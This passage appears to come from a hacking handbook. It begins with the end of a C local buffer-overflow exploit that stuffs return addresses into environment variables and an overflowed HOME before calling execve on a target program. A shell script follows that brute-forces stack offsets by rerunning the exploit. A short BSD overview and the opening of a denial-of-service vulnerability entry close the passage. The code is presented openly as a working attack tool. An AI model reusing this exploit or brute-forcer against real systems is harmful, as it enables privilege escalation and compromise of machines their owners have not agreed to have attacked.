```
}
    while(i++<max)
      buff[i]=reta;
    buff[i]=0;
    for(i=0;i<max-1;i++)
      frame[i]=reta;
    frame[i]=0;

    /* 4 vars 'cause the correct one should be aligned at 4bytes bounda
    ry */
    newenv[0]=createvar("EGGSHEL",(char*)&buff[0]);
    newenv[1]=createvar("EGGSHE2",(char*)&buff[0]);
    newenv[2]=createvar("EGGSHE3",(char*)&buff[0]);
    newenv[3]=createvar("EGGSHE4",(char*)&buff[0]);
    newenv[4]=createvar("DISPLAY",getenv("DISPLAY"));
    newenv[5]=createvar("HOME",(char*)&frame[0]);
    newenv[6]=NULL;
    args[0]=prog2;
    puts("Start... ");/*Here we go*/
    execve(prog,args,newenv);
    perror("Error executing execve \n");
    /*          Georgi Guninski guninski@hotmail.com
            http://www.geocities.com/ResearchTriangle/1711*/
}
-brute-script---------------------------------------------------------
----
#!/bin/ksh
L=200
O=40
while [ $L -lt 12000 ]
do
    echo $L
    L=`expr $L + 96`
    ./a.out $L
done
```

# **BSD**

The BSD operating system, broadly known as the Berkeley version of UNIX, is found in many variations and is widely used for Internet services and firewalls. Commonly running on Intel and Sun architecture, BSD can deliver a high-performance Internet OS/ used for DNS, Web hosting, email, security, VPN access, and much more. The BSD product line is based on the central source developed by Berkeley Software Design, Inc., featuring BSDi, FreeBSD, NetBSD, and OpenBSD flavors. BSDi (www.bsd.com) is known as an Internet infrastructure-grade system with software and solutions that are backed by first-rate service and support.

# **Liabilities**

Denial-of-Service Attack

**Synopsis:** BSD is vulnerable to a DoS attack; sending customized packets to drop active TCP connections.

**Hack State:** Severe congestion.